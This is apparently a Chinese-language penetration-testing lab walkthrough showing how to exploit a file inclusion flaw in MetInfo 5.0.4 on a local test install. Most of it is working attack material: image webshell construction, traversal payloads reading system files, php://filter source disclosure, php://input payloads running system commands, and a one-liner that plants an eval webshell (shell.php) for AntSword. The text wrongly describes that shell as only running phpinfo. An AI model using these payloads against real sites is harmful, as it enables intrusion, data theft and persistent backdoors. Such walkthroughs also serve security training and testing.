## metinfo案例

以[metinfo_5.0.4](http://v.metinfo.cn/dowload.php?ver=5.0.4)为例

该环境的文件上传点在`admin`路径下

![image-20230831193515013](./imgs/e2243e1b3855efb0f1352b8c9dbf2630.png)

但是上传文件会失败，

所以直接在网站的`upload\file`下放入图片木马

---

文件包含漏洞利用点：`/about/index.php?fmodule=7&module=[filePath]`

##### 1、蚁剑直接连接图片马

图片马制作：

```php
copy 1.jpg/b+1.php/a 22.jpg
```

上传图片木马，通过文件包含的方式去访问

```php
http://127.0.0.1/MetInfo5.0.4//about/index.php?fmodule=7&module=../upload/file/22.jpg
```

![image-20230831202933167](./imgs/d623709be9bc9b2e0b4e9307c8721b66.png)

使用蚁剑连接

![image-20230831194711403](./imgs/bef787dec65ea9e5c00c4bc90a9f8a0c.png)

![image-20230831195001401](./imgs/45f6794a4af3477b6304a1790f40fc47.png)

#####  2、读取敏感目录

```php
http://127.0.0.1/MetInfo5.0.4//about/index.php?fmodule=7&module=../../../../../../../../../../../windows/system32/drivers/etc/hosts
```

![image-20230831195333142](./imgs/b6e2f3512b8a1bf55ad46dadd4c47780.png)

##### 3、读取php源码

```php
http://127.0.0.1/MetInfo5.0.4/about/index.php?fmodule=7&module=php://filter/read=convert.base64-encode/resource=show.php
```

![image-20230831195846864](./imgs/747bd29daf6ddef71ff1315a2e4c7f9c.png)

读取结果：

```php
PD9waHANCiMgTWV0SW5mbyBFbnRlcnByaXNlIENvbnRlbnQgTWFuYWdlbWVudCBTeXN0ZW0gDQojIENvcHlyaWdodCAoQykgTWV0SW5mbyBDby4sTHRkIChodHRwOi8vd3d3Lm1ldGluZm8uY24pLiBBbGwgcmlnaHRzIHJlc2VydmVkLiANCnJlcXVpcmVfb25jZSAnLi4vaW5jbHVkZS9jb21tb24uaW5jLnBocCc7DQppZighJGlkICYmICRjbGFzczEpJGlkID0gJGNsYXNzMTsNCiRzaG93ID0gJGRiLT5nZXRfb25lKCJTRUxFQ1QgKiBGUk9NICRtZXRfY29sdW1uIFdIRVJFIGlkPSRpZCBhbmQgbW9kdWxlPTEiKTsNCmlmKCEkc2hvd3x8ISRzaG93Wydpc3Nob3cnXSl7DQpva2luZm8oJy4uLzQwNC5odG1sJyk7DQp9DQokbWV0YWNjZXNzPSRzaG93W2FjY2Vzc107DQppZigkc2hvd1tjbGFzc3R5cGVdPT0zKXsNCiRzaG93MyA9ICRkYi0+Z2V0X29uZSgiU0VMRUNUICogRlJPTSAkbWV0X2NvbHVtbiBXSEVSRSBpZD0nJHNob3dbYmlnY2xhc3NdJyIpOw0KJGNsYXNzMT0kc2hvdzNbYmlnY2xhc3NdOw0KJGNsYXNzMj0kc2hvd1tiaWdjbGFzc107DQokY2xhc3MzPSRzaG93W2lkXTsNCn1lbHNlew0KJGNsYXNzMT0kc2hvd1tiaWdjbGFzc10/JHNob3dbYmlnY2xhc3NdOiRpZDsNCiRjbGFzczI9JHNob3dbYmlnY2xhc3NdPyRpZDoiMCI7DQokY2xhc3MzPTA7DQp9DQoNCnJlcXVpcmVfb25jZSAnLi4vaW5jbHVkZS9oZWFkLnBocCc7DQokY2xhc3MxX2luZm89JGNsYXNzX2xpc3RbJGNsYXNzMV07DQokY2xhc3MxX2xpc3Q9JGNsYXNzMV9pbmZvOw0KJGNsYXNzMl9pbmZvPSRjbGFzc19saXN0WyRjbGFzczJdOw0KJGNsYXNzM19pbmZvPSRjbGFzc19saXN0WyRjbGFzczNdOw0KJHNob3dbY29udGVudF09Y29udGVudHNob3coJzxkaXY+Jy4kc2hvd1tjb250ZW50XS4nPC9kaXY+Jyk7DQokc2hvd1tkZXNjcmlwdGlvbl09JHNob3dbZGVzY3JpcHRpb25dPyRzaG93W2Rlc2NyaXB0aW9uXTokbWV0X2tleXdvcmRzOw0KJHNob3dba2V5d29yZHNdPSRzaG93W2tleXdvcmRzXT8kc2hvd1trZXl3b3Jkc106JG1ldF9rZXl3b3JkczsNCiRtZXRfdGl0bGU9JG1ldF90aXRsZT8kc2hvd1snbmFtZSddLictJy4kbWV0X3RpdGxlOiRzaG93WyduYW1lJ107DQppZigkc2hvd1snY3RpdGxlJ10hPScnKSRtZXRfdGl0bGU9JHNob3dbJ2N0aXRsZSddOw0KcmVxdWlyZV9vbmNlICcuLi9wdWJsaWMvcGhwL21ldGh0bWwuaW5jLnBocCc7DQppbmNsdWRlIHRlbXBsYXRlKCdzaG93Jyk7DQpmb290ZXIoKTsNCiMgVGhpcyBwcm9ncmFtIGlzIGFuIG9wZW4gc291cmNlIHN5c3RlbSwgY29tbWVyY2lhbCB1c2UsIHBsZWFzZSBjb25zY2lvdXNseSB0byBwdXJjaGFzZSBjb21tZXJjaWFsIGxpY2Vuc2UuDQojIENvcHlyaWdodCAoQykgTWV0SW5mbyBDby4sIEx0ZC4gKGh0dHA6Ly93d3cubWV0aW5mby5jbikuIEFsbCByaWdodHMgcmVzZXJ2ZWQuDQo/
```

**得出base64编码格式的数据，使用bp的Decoder功能进行base64解码**

![image-20230831200327585](./imgs/2ce7cba84204aa2b62a12ec063880a3b.png)

也可以利用`HackBar`浏览器插件

![image-20230831203152587](./imgs/ea8fe33fa4163472b615486f90cf5a70.png)

复制得到的base64编码格式的php代码

![image-20230831203229014](./imgs/867ca9ca49d7a564386e696ddb4a3361.png)

点击 OK

![image-20230831203246960](./imgs/38f2d0f5ade64295f74815e671f96446.png)

解码成功！

##### 4、执行PHP命令

bp拦截得到php源码的数据包

![image-20230831203612019](./imgs/eb09387e5d131bf2cfca83be16eb6899.png)

发送到`Repeater`模块

把`GET包`该成`POST数据包`

![image-20230831203757067](./imgs/3248470fe88283fb162ca848dc8d4895.png)



得到POST数据包

![image-20230831203826720](./imgs/ded6dc5692c860cb7cd5c62a21741492.png)

把POST请求体中的变量放到url中提交

**虽然说是POST数据包，但是POST数据包的url中也可以用GET参数**

![image-20230831204202648](./imgs/d14dc49805ff36c767e2aa4967a2da43.png)

把`fmodule=7&module=`的值改成`php://input`，然后在下面写入php代码，点击send

```php
<?php phpinfo();?>
```



![image-20230831204822277](./imgs/60ebd447a206f0d126bfb7f7025b6e14.png)

执行系统代码

```php
<?php 
system("whoami")
?>
```

![image-20230831204944450](./imgs/7e7ea705968df7bec289340ae8d22652.png)

```php
<?php 
system("ipconfig")
?>
```

![image-20230831205049196](./imgs/14e9b75228e419e4fd30cc5014183521.png)

##### 5、包含木马写Shell （图片马制作新方法）

```php
<?php fputs(fopen("shell.php",'w'),'<?=@eval($_REQUEST[777]);phpinfo();?>')?>
```

该段代码的含义是，在当前目录下创建一个名为`shell.php`的文件，内容为`<?php phpinfo();?>`，当我们直接包含图片的时候，这段代码就会被执行


重新再`upload\file`下放入一张没有木马的图片，使用另一种方式制作图片木马

`点击图片---右键属性---详细信息`



![image-20230831205925746](./imgs/a53debc807bc0e4d12be664d557ac7f7.png)

点击`应用`，点击`确定`

在浏览器中访问图片`http://127.0.0.1/MetInfo5.0.4/upload/file/1.jpg`，图片正常显示

![image-20230831210030370](./imgs/ca4711f9c68e96a8692cf9ca3d37440f.png)

使用文件包含的方式去访问图片

```php
http://127.0.0.1/MetInfo5.0.4/about/index.php?fmodule=7&module=../upload/file/1.jpg
```

页面显示如下：

![image-20230831210513335](./imgs/e78acc69b23e67e15027da163fb31a1f.png)

随即发现在`upload`文件夹中有个新建文件shell.php，即可用蚁剑连接

![image-20230831210339836](./imgs/ca99ea9d6066afba4db903cbf11d35a3.png)

![image-20230831210423508](./imgs/eee9ef919232148a124f847c275cf54d.png)
